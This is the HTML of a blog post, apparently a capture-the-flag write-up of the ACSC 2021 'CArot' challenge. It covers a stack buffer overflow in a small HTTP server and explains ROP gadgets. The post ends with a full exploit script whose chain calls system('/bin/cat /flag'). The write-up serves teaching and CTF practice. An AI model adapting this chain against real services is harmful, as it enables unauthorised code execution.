@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CTF : https:&#x2F;&#x2F;acsc.asia&#x2F;Challenge files : https:&#x2F;&#x2F;github.com&#x2F;4n0nym4u5&#x2F;CTF-Writeups&#x2F;tree&#x2F;main&#x2F;CArotPoints: 320  Checksec123456Arch:     amd64-64-littleRELRO:    Full RELROStack:    No canary foundNX">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ACSC 2021 CArot writeup">
+<meta property="og:url" content="http://4n0nym4u5.github.io/2022/01/14/CArot/index.html">
+<meta property="og:site_name" content="4n0nym4u5">
+<meta property="og:description" content="CTF : https:&#x2F;&#x2F;acsc.asia&#x2F;Challenge files : https:&#x2F;&#x2F;github.com&#x2F;4n0nym4u5&#x2F;CTF-Writeups&#x2F;tree&#x2F;main&#x2F;CArotPoints: 320  Checksec123456Arch:     amd64-64-littleRELRO:    Full RELROStack:    No canary foundNX">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://acsc.asia/assets/images/acsc_banner.jpg">
+<meta property="article:published_time" content="2022-01-14T08:45:00.000Z">
+<meta property="article:modified_time" content="2023-02-01T17:27:24.934Z">
+<meta property="article:author" content="4n0nym4u5">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="stack">
+<meta property="article:tag" content="rop">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://acsc.asia/assets/images/acsc_banner.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ACSC 2021 CArot writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/05/10/San%20Diego%20CTF%202022/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/01/10/MIPSunderstanding/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://4n0nym4u5.github.io/2022/01/14/CArot/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&text=ACSC 2021 CArot writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&title=ACSC 2021 CArot writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&is_video=false&description=ACSC 2021 CArot writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ACSC 2021 CArot writeup&body=Check out this article: http://4n0nym4u5.github.io/2022/01/14/CArot/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&title=ACSC 2021 CArot writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&title=ACSC 2021 CArot writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&title=ACSC 2021 CArot writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&title=ACSC 2021 CArot writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://4n0nym4u5.github.io/2022/01/14/CArot/&name=ACSC 2021 CArot writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://4n0nym4u5.github.io/2022/01/14/CArot/&t=ACSC 2021 CArot writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Checksec"><span class="toc-number">1.</span> <span class="toc-text">Checksec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Overview"><span class="toc-number">2.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#read-primitive"><span class="toc-number">3.1.</span> <span class="toc-text">read primitive</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#write-primitive"><span class="toc-number">3.2.</span> <span class="toc-text">write primitive</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#add-primitive"><span class="toc-number">3.3.</span> <span class="toc-text">add primitive</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#expl-py"><span class="toc-number">3.4.</span> <span class="toc-text">expl.py</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ACSC 2021 CArot writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">4n0nym4u5</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-01-14T08:45:00.000Z" itemprop="datePublished">2022-01-14</time>
+        
+        (Updated: <time datetime="2023-02-01T17:27:24.934Z" itemprop="dateModified">2023-02-01</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>, <a class="tag-link-link" href="/tags/rop/" rel="tag">rop</a>, <a class="tag-link-link" href="/tags/stack/" rel="tag">stack</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><img src="https://acsc.asia/assets/images/acsc_banner.jpg"></p>
+<blockquote>
+<p>CTF : <a target="_blank" rel="noopener" href="https://acsc.asia/">https://acsc.asia/</a><br>Challenge files : <a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5/CTF-Writeups/tree/main/CArot">https://github.com/4n0nym4u5/CTF-Writeups/tree/main/CArot</a><br>Points: 320</p>
+</blockquote>
+<h1 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h1><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Full</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x3ff000)</span></span><br><span class="line"><span class="attr">RUNPATH:</span>  <span class="string">&#x27;/home/init0/share/bkup/CTF/ACSC-21/CArot&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h1><p>These are the challenge files provided:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">CArot</span><br><span class="line">├── carot</span><br><span class="line">├── carot.c</span><br><span class="line">├── expl.py</span><br><span class="line">├── ld<span class="number">-2.31</span>.so</span><br><span class="line">├── libc.so<span class="number">.6</span></span><br><span class="line">├── proxy.py</span><br><span class="line">├── run_carot.sh</span><br><span class="line">├── run_proxy.sh</span><br><span class="line">├── xinetd_carot_conf</span><br><span class="line">└── xinetd_proxy_conf</span><br></pre></td></tr></table></figure>
+
+<p>So they have provided the challenge source file <code>carot.c</code>. Let’s look at it. The source code is pretty huge so ill cut it down to only what’s necessary</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">http_receive_request</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> read_limit = <span class="number">4096</span>;</span><br><span class="line"></span><br><span class="line">  connect_mode = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> buffer[BUFFERSIZE] = &#123;&#125;;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%[^\n]&quot;</span>, buffer); <span class="comment">// stack buffer overflow</span></span><br><span class="line">  getchar();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">memcmp</span>(buffer, <span class="string">&quot;GET &quot;</span>, <span class="number">4</span>) != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> n = <span class="built_in">strlen</span>(buffer); <span class="comment">// use \x00 to make n &lt; 9</span></span><br><span class="line">  read_limit -= n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt; <span class="number">9</span>) <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">// we have to reach here and then execute our ROP chain</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">char</span>* fname = http_receive_request();</span><br><span class="line">    <span class="keyword">if</span> (fname == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      http_send_reply_bad_request();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      try_http_send_reply_with_file(fname);</span><br><span class="line">      <span class="built_in">free</span>(fname); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (connect_mode != KEEP_ALIVE) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The binary uses a python proxy to run. </p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdin, stdout, exit</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">LIMIT = <span class="number">4096</span></span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  s = stdin.buffer.readline()</span><br><span class="line">  buf += s</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(buf) &gt; LIMIT:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;You are too greedy&#x27;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> s == <span class="string">b&#x27;\n&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">p.connect((<span class="string">&quot;localhost&quot;</span>, <span class="number">11452</span>))</span><br><span class="line">p.sendall(buf)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.setblocking(<span class="literal">False</span>)</span><br><span class="line">res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    s = p.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;breaking&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    res += s</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">stdout.buffer.write(res)</span><br></pre></td></tr></table></figure>
+
+<p>So because of the proxy we can only send stdin once. Though we can get leaks printed out on stdout we cant use that leak for our second rop chain. So not a simple ret2libc challenge here.  We got only one shot and we printout flag to stdout. So lets move on to exploitation part now (my favourite part UwU).</p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>Lets look out for some useful gadgets first. I found some interesting gadget using <a target="_blank" rel="noopener" href="https://github.com/entropic-security/xgadget">xgadget</a>. Its a pretty nice rop gadget finder tool. So listing out some useful gadgets here.</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x000000004011c8: add [rbp-<span class="number">0</span>x3d], ebx; nop <span class="selector-attr">[rax+rax]</span>; ret; </span><br><span class="line"><span class="number">0</span>x00000000401902: mov [rbp-<span class="number">0</span>x8], rax; mov rax, <span class="selector-attr">[rbp-0x8]</span>; add rsp, <span class="number">0</span>x250; pop rbp; ret; </span><br><span class="line"><span class="number">0</span>x000000004014bd: mov rax, [rbp-<span class="number">0</span>x8]; add rsp, <span class="number">0</span>x10; pop rbp; ret;</span><br></pre></td></tr></table></figure>
+
+<p>These three rop gadgets can be used creatively. <br></p>
+<h2 id="read-primitive"><a href="#read-primitive" class="headerlink" title="read primitive"></a>read primitive</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x000000004014bd: mov rax, [rbp-<span class="number">0</span>x8]; add rsp, <span class="number">0</span>x10; pop rbp; ret;</span><br></pre></td></tr></table></figure>
+
+<p>So we can use this gadget to read value of a pointer and store it in rax register <br></p>
+<h2 id="write-primitive"><a href="#write-primitive" class="headerlink" title="write primitive"></a>write primitive</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x00000000401902: mov [rbp-<span class="number">0</span>x8], rax; mov rax, <span class="selector-attr">[rbp-0x8]</span>; add rsp, <span class="number">0</span>x250; pop rbp; ret; </span><br></pre></td></tr></table></figure>
+
+<p>We can use this gadget to write the value stored in rax to any writable memory pointed by [rbp-0x8]. And then it increments rsp with 0x250 so we have to add a padding of 0x250 bytes and 0x8 bytes to satisfy the pop rbp instruction. <br> </p>
+<h2 id="add-primitive"><a href="#add-primitive" class="headerlink" title="add primitive"></a>add primitive</h2><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x000000004011c8: add [rbp-<span class="number">0</span>x3d], ebx; nop <span class="selector-attr">[rax+rax]</span>; ret; </span><br></pre></td></tr></table></figure>
+
+<p>We can use this gadget to add the value of a pointer with arbitrary value. So with this primitive we can craft any value. So i used this primitive for arbitrary write what where. My friend <code>X3eRo0</code> named it as 3dgadget 😂 <br></p>
+<p>So the exploit steps are like this:</p>
+<ol>
+<li>We read __libc_start_main address into rax.</li>
+<li>We write __libc_start_main into bss.</li>
+<li>We write the string “&#x2F;bin&#x2F;cat &#x2F;flag\x00” to bss using the 3dgadget.</li>
+<li>We use the 3dgadget to change __libc_start_main address to system in bss</li>
+<li>We stack pivot right above our crafted system address in bss and execute</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;/bin/cat /flag\x00&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="expl-py"><a href="#expl-py" class="headerlink" title="expl.py"></a>expl.py</h2><figure class="highlight python"><figcaption><span>expl.py</span><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/4n0nym4u5/CTF-Writeups/main/CArot/expl.py">expl.py</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3.9</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author := 4n0nym4u5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> rootkit <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe  = context.binary = ELF(<span class="string">&#x27;./carot&#x27;</span>)</span><br><span class="line">host = args.HOST <span class="keyword">or</span> <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">port = <span class="built_in">int</span>(args.PORT <span class="keyword">or</span> <span class="number">11451</span>)</span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">tbreak main</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arb_write</span>(<span class="params">addr, string</span>):</span><br><span class="line">	string=string+<span class="string">b&quot;\x00&quot;</span>*(<span class="number">8</span>-(<span class="built_in">len</span>(string)%<span class="number">8</span>))</span><br><span class="line">	a=seperate(string, <span class="number">4</span>)</span><br><span class="line">	j=<span class="number">0</span></span><br><span class="line">	payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">		<span class="keyword">if</span> i == <span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>:</span><br><span class="line">			j=j+<span class="number">4</span></span><br><span class="line">			<span class="keyword">continue</span> <span class="comment"># skip the unnecessary add instruction if ebx is 0  </span></span><br><span class="line">		payload += _3d_write(addr+j, i.ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">		j=j+<span class="number">4</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_3d_write</span>(<span class="params">addr,value</span>):</span><br><span class="line">	tmp = flat([</span><br><span class="line"></span><br><span class="line">		<span class="number">0x4019f2</span>, <span class="comment"># pop rbx, rbp, r[12 13 14 15]</span></span><br><span class="line">		value,</span><br><span class="line">		addr+<span class="number">0x3d</span>,</span><br><span class="line">		p(<span class="number">0</span>)*<span class="number">4</span>,</span><br><span class="line">		_3d_gadget</span><br><span class="line"></span><br><span class="line">	])</span><br><span class="line">	<span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">libc=SetupLibcELF()</span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">R = Rootkit(io)</span><br><span class="line"></span><br><span class="line">mov_rax_rbp = <span class="number">0x4014bd</span> <span class="comment">#    mov rax,QWORD PTR [rbp-0x8]; add rsp,0x10; ret</span></span><br><span class="line">_3d_gadget  = <span class="number">0x4011c8</span> <span class="comment">#    add [rbp-0x3d], ebx; nop [rax+rax]; ret; </span></span><br><span class="line">mov_rbp_rax = <span class="number">0x401902</span> <span class="comment">#    mov [rbp-0x8], rax; mov rax, [rbp-0x8]; add rsp, 0x250; pop rbp; ret;</span></span><br><span class="line"></span><br><span class="line">header = <span class="string">b&quot;GET &quot;</span> + <span class="string">b&quot;\x00&quot;</span>*<span class="number">524</span></span><br><span class="line">bss=<span class="number">0x404040</span></span><br><span class="line">system = bss+<span class="number">0xe80</span></span><br><span class="line"></span><br><span class="line">rop=flat([</span><br><span class="line"></span><br><span class="line">	header,</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># put a libc address at bss</span></span><br><span class="line">	exe.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]+<span class="number">8</span>, <span class="comment"># rbp</span></span><br><span class="line">	mov_rax_rbp, <span class="comment"># make rax point to __libc_start_main</span></span><br><span class="line">	p(<span class="number">0</span>)*<span class="number">3</span>, <span class="comment"># junk</span></span><br><span class="line">	pop(<span class="string">&quot;rbp&quot;</span>, system+<span class="number">8</span>),</span><br><span class="line">	mov_rbp_rax, <span class="comment"># write rax to bss address (system variable points to that address in bss)</span></span><br><span class="line">	<span class="string">b&quot;\x00&quot;</span>*<span class="number">0x250</span>, p(<span class="number">0xdeadbeef</span>), <span class="comment"># junk</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># write /bin/sh to bss</span></span><br><span class="line">	arb_write(bss+<span class="number">0x10</span>, <span class="string">b&quot;/bin/cat /flag\x00&quot;</span>),</span><br><span class="line"></span><br><span class="line">	<span class="comment"># change __libc_start_main to system ; system = __libc_start_main + 0x2e450</span></span><br><span class="line">	_3d_write(system, p(<span class="number">0x2e450</span>)),</span><br><span class="line"></span><br><span class="line">	<span class="comment"># write pop rdi -&gt; bss gadget before system address in bss</span></span><br><span class="line">	arb_write(system-<span class="number">16</span>, gadget(<span class="string">&quot;pop rdi; ret&quot;</span>) + p(bss+<span class="number">0x10</span>)),</span><br><span class="line"></span><br><span class="line">	<span class="comment"># call system(&quot;/bin/cat /flag\x00&quot;)</span></span><br><span class="line">	<span class="number">0x000000004019f5</span>, <span class="comment"># pop rsp; r[13, 14, 15]; ret</span></span><br><span class="line">	system-<span class="number">24</span>-<span class="number">16</span>, <span class="comment"># stack pivot to pop rdi that we crafted above system address in bss </span></span><br><span class="line"></span><br><span class="line">])</span><br><span class="line">sl(rop)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(rop) &lt; <span class="number">4096</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/4n0nym4u5">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
